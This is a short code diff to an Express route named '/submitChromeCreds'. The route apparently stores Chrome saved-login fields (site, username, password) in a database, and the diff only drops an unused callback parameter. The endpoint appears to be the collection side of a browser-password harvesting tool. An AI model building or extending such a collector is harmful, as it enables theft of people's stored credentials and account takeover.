@@ -39,7 +39,7 @@ router.post('/submitChromeCreds', function(req, res, next) {
       /* insert the data sanatized to prevent sql injection */
       db.query(query,
           [ranStamp, el.signon_realm, el.username_value, el.password_value],
-          function(err, status) {
+          function(err) {
             if (err) {
               return next(err);
             }
